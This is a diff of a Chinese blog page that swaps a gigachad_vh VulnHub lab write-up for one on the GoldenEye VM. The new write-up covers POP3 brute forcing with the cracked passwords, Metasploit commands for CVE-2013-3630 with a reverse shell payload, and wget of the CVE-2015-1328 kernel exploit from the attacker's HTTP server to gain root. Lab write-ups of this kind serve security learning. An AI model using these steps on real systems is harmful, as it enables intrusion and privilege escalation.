@@ -3,7 +3,7 @@
 <html lang="zh-Hans">
     <head>
         <meta charset="utf-8" />
-        <title>gigachad_vh靶机学习 | 小C♥天天</title>
+        <title>GoldenEye靶机学习 | 小C♥天天</title>
         <meta name="author" content="小C&天天" />
         <meta name="description" content="^v^" />
         <meta name="keywords" content="" />
@@ -192,7 +192,7 @@
                 <div id="article-posts-wrap" true ref="homePostsWrap">
     <div class="article">
         <div>
-            <h1>gigachad_vh靶机学习</h1>
+            <h1>GoldenEye靶机学习</h1>
         </div>
         <div class="info">
             <span class="date">
@@ -220,7 +220,12 @@
                 
                 <span class="tag">
                     
-                    <a href="/tags/%E9%9D%B6%E6%9C%BA/" style="color: #ffa2c4">靶机</a>
+                    <a href="/tags/%E9%9D%B6%E6%9C%BA/" style="color: #ff7d73">靶机</a>
+                </span>
+                
+                <span class="tag">
+                    
+                    <a href="/tags/vulnhub/" style="color: #00a596">vulnhub</a>
                 </span>
                 
             </span>
@@ -228,39 +233,97 @@
         </div>
         
         <div class="content" v-pre>
-            <h1 id="壹-题目信息"><a href="#壹-题目信息" class="headerlink" title="壹 题目信息"></a>壹 题目信息</h1><p>名字：<code>gigachad_vh</code><br>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/gigachad-1,657/">传送门</a><br>靶机<code>IP</code>：<code>192.168.239.150</code></p>
+            <h1 id="壹-题目信息"><a href="#壹-题目信息" class="headerlink" title="壹 题目信息"></a>壹 题目信息</h1><p>名字：<code>GoldenEye</code><br>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/goldeneye-1,240/">传送门</a><br>靶机<code>IP</code>：<code>192.168.239.147</code></p>
 <span id="more"></span>
 
 <h1 id="贰-解题"><a href="#贰-解题" class="headerlink" title="贰 解题"></a>贰 解题</h1><p>端口扫描：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/gigachad_vh%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221114155248034.png" alt="image-20221114155248034"></p>
-<p>复现有21端口和80端口，访问<code>80</code>，发现没有什么利用的，尝试frp进入，发现是无密码登录，并且有一个文件，将其下载：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/gigachad_vh%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221114161011576.png" alt="image-20221114161011576"></p>
-<p>使用<code>file</code>命令查看文件类型：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/gigachad_vh%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221114161356256.png" alt="image-20221114161356256"></p>
-<p>发现提示，用户名是<code>chad</code>，密码提示了<code>/drippinchad.png</code>这个图片，猜测可以通过<code>80</code>访问：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/gigachad_vh%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221114162032544.png" alt="image-20221114162032544"></p>
-<p>下载下来发现没有什么发现，根据图片提示尝试搜索图片信息（百度的）：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/gigachad_vh%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221114162136257.png" alt="image-20221114162136257"></p>
-<p>把建筑物截下来搜的，是<code>maiden&#39;s tower</code>，用这个尝试登录<code>ssh</code>，尝试密码为<code> maidenstower</code>登录：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/gigachad_vh%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221114162420996.png" alt="image-20221114162420996"></p>
-<p>获得第一个<code>flag</code>：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/gigachad_vh%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221114162500579.png" alt="image-20221114162500579"></p>
-<p>提权看百度的，查看查看权限和<code>SUID</code>文件：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/gigachad_vh%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221114164255496.png" alt="image-20221114164255496"></p>
-<p><code>s-nail</code>是一个邮件的<code>MUA</code>软件，<code>/s-nail/s-nail-privsep</code>有提权漏洞：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/gigachad_vh%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221114164310712.png" alt="image-20221114164310712"></p>
-<p>查看系统的<code>s-nail</code>版本，是<code>v14.8.6</code>，存在漏洞：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/gigachad_vh%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221114164854206.png" alt="image-20221114164854206"></p>
-<p>将<code>exp</code>发送到靶机上，进行提权：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/gigachad_vh%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221114165017604.png" alt="image-20221114165017604"></p>
-<p>但是由于该漏洞为竞争漏洞，需要循环运行<code>while true; do ./47172.sh ;done</code>，运行完后获得<code>flag</code>：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/gigachad_vh%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221114165319125.png" alt="image-20221114165319125"></p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/gigachad_vh%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221114165419048.png" alt="image-20221114165419048"></p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102155627827.png" alt="image-20221102155627827"></p>
+<p>存在25，80，110，55006，55007端口开放，接着从80入手，访问：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102142450683.png" alt="image-20221102142450683"></p>
+<p>存在两个问题：<code>terminal.js</code>和<code>/sev-home/</code>，分别访问发现<code>http://192.168.239.147/terminal.js</code>存在密码泄露，<code>http://192.168.239.147/sev-home/</code>需要登录：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102154111611.png" alt="image-20221102154111611"></p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102154121736.png" alt="image-20221102154121736"></p>
+<p><code>http://192.168.239.147/terminal.js</code>存在密码泄露，即将<code>&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</code>进行<code>HTML</code>编码，获得密码为：<code>InvincibleHack3r</code>，并且根据提示发现用户名为<code>Boris</code>，由于外国人的名字首字母大写，所以原来的用户名应该是<code>boris</code>：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102154254581.png" alt="image-20221102154254581"></p>
+<p>登陆后，查看前端信息发现，包含两个管理员<code>Natalya</code>、<code>Boris</code>，在根据网页里面的提示打开了<code>pop3</code>，回想起前面的两个高端口：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102154826225.png" alt="image-20221102154826225"></p>
+<p>通过<code>telnet</code>访问两个端口发现<code>55007</code>存在<code>pop3</code>：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102160323341.png" alt="image-20221102160323341"></p>
+<p>尝试登录，发现前面的用户名密码已经用不了：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102160939766.png" alt="image-20221102160939766"></p>
+<p>开始尝试爆破，根据前面的两个用户名生成四个用户名<code>Natalya</code>、<code>natalya</code>、<code>Boris</code>、<code>boris</code>：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102163405682.png" alt="image-20221102163405682"></p>
+<pre><code class="bash">[55007][pop3] host: 192.168.239.147   login: Natalya   password: bird
+[55007][pop3] host: 192.168.239.147   login: natalya   password: bird
+[55007][pop3] host: 192.168.239.147   login: Boris   password: secret1!
+[55007][pop3] host: 192.168.239.147   login: boris   password: secret1!
+</code></pre>
+<p><code>Natalya</code>和<code>natalya</code>，<code>Boris</code>和<code>boris</code>属于同一账户，邮件内容一样，登录<code>natalya</code>邮箱进行查看：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102163815629.png" alt="image-20221102163815629"></p>
+<p>查看两封邮件发现，存在一个用户名密码以及一个域名以及<code>/etc/hosts</code>：</p>
+<pre><code class="bash">域名：severnaya-station.com/gnocertdir
+用户名密码：
+username: xenia
+password: RCP90rulez!
+</code></pre>
+<p>登录<code>boris</code>邮箱进行查看：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102164948278.png" alt="image-20221102164948278"></p>
+<p>提示了有一份文件使用<code>GoldenEye</code>作为访问代码作为附件发送，并且放在此服务器的根目录下隐藏文件，但此处无法查看到附件内容，不过我们可以根据<code>natalya</code>邮箱，设置<code>hosts</code>文件，访问：<code>http://severnaya-station.com/gnocertdir/</code>：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102172938877.png" alt="image-20221102172938877"></p>
+<p>可以发现是一个<code>moodle</code>开源<code>cms</code>系统，简单翻阅一下，发现存在登录，尝试前面的用户名密码：<code>xenia\RCP90rulez!</code>，登陆成功：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102173510358.png" alt="image-20221102173510358"></p>
+<p>接着又是翻阅，发现一个用户<code>doak</code>，是邮箱，我们接着对其进行爆破，发现也是弱口令<code>doak\goat</code>：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102174232773.png" alt="image-20221102174232773"></p>
+<p>登录查看邮箱，存在一个邮件：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102174215718.png" alt="image-20221102174215718"></p>
+<p>查看邮件又获得一个用户名密码<code>dr_doak\4England!</code>：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102174406771.png" alt="image-20221102174406771"></p>
+<p>登录该用户，获得一个文件：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102174737238.png" alt="image-20221102174737238"></p>
+<p>下载下来了，查看，说在这个目录<code>/dir007key/for-007.jpg</code>有一个图片，可能包含<code>adm1n</code>的信息：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102174915901.png" alt="image-20221102174915901"></p>
+<p>访问<code>http://severnaya-station.com/dir007key/for-007.jpg</code>，下载下来：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102175220107.png" alt="image-20221102175220107"></p>
+<p>对图片进行一遍操作，发现使用<code>exiftool for-007.jpg</code>执行发现有<code>base64</code>编码：<code>eFdpbnRlcjE5OTV4IQ==</code>，必有猫腻，解码为<code>xWinter1995x!</code>，猜测会不会是前面<code>admin</code>的密码：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102175732861.png" alt="image-20221102175732861"></p>
+<p>尝试后发现是<code>admin</code>，登录后，查看有没有有用的信息，可以看到是<code>moodle</code>版本为<code>2.2.3</code>：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102182325429.png" alt="image-20221102182325429"></p>
+<p>在网上查找对应版本的漏洞，发现为有<code>CVE-2013-3630</code>，尝试使用<code>msf</code>进行攻击：</p>
+<pre><code class="bash">search CVE-2013-3630
+use exploit/multi/http/moodle_spelling_binary_rce
+set username admin
+set password xWinter1995x!
+set rhosts severnaya-station.com
+set targeturi /gnocertdir
+set payload cmd/unix/reverse
+set lhost 192.168.239.142
+options
+</code></pre>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105224206276.png" alt="image-20221105224206276"></p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105224309860.png" alt="image-20221105224309860"></p>
+<p>注意这时候还不可以利用，因为<code>msf</code>的底层代码使用的是<code>pspellshell</code>，网页使用的是<code>Googleshell</code>，导致没有办法去运行，所以在网页的<code>TinyMCE HTML editor</code>处选择<code>pspellshell</code>：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105224656259.png" alt="image-20221105224656259"></p>
+<p>然后利用：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105225020421.png" alt="image-20221105225020421"></p>
+<p>利用后获得的是一个伪<code>shell</code>，所以我们可以使用<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; </code>获得一个交互的<code>shell</code>：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105225348124.png" alt="image-20221105225348124"></p>
+<p>查看系统信息，发现内核版本<code>Linux ubuntu 3.13.0-32</code>，存在<code>CVE-2015-1328</code>提取漏洞，<code>kali</code>里有<code>CVE-2015-1328</code>攻击脚本：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105230236330.png" alt="image-20221105230236330"></p>
+<pre><code class="bash">searchsploit 37292
+cp /usr/share/exploitdb/exploits/linux/local/37292.c /root/桌面/
+// 由于靶场无法进行gcc编译，需要改成cc，即编辑脚本37292.c，将第143行的gcc改成cc
+</code></pre>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105230458058.png" alt="image-20221105230458058"></p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105230116214.png" alt="image-20221105230116214"></p>
+<p>然后在存在<code>exp</code>的目录下开<code>http</code>服务：<code>python2 -m SimpleHTTPServer 8888</code>，接着在<code>msf</code>获得的靶机终端，执行<code>wget http://10.10.10.129:8888/37292.c</code>，并编译<code>cc -o exp 37292.c </code>，最后执行<code>exp</code>，在<code>/root</code>目录下的<code>.flag.txt</code>获得<code>flag</code>：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105231013332.png" alt="image-20221105231013332"></p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105231409418.png" alt="image-20221105231409418"></p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105231701284.png" alt="image-20221105231701284"></p>
+<p>根据提示访问<code>http://severnaya-station.com/006-final/xvf7-flag/</code>：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105231939196.png" alt="image-20221105231939196"></p>
 <h1 id="叁-需要学习的知识"><a href="#叁-需要学习的知识" class="headerlink" title="叁 需要学习的知识"></a>叁 需要学习的知识</h1><ul>
-<li><p>提权查看<code>suid</code>文件，命令：<code>find / -perm -u=s -type f 2&gt; /dev/null</code>，参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/banglook/p/16019354.html">https://www.cnblogs.com/banglook/p/16019354.html</a></p>
-</li>
-<li><p><code>/s-nail/s-nail-privsep</code>提权漏洞</p>
-</li>
+<li><code>pop</code>服务访问</li>
+<li><code>Linux</code>提权：<code>CVE-2015-1328</code></li>
 </ul>
 
         </div>
@@ -430,7 +493,7 @@
         <script>
             var v = new Viewer({
                 basePath: "/model",
-                role: "tianlangxing_3",
+                role: "tierbici_2",
                 mobile: true,
             });
         </script>
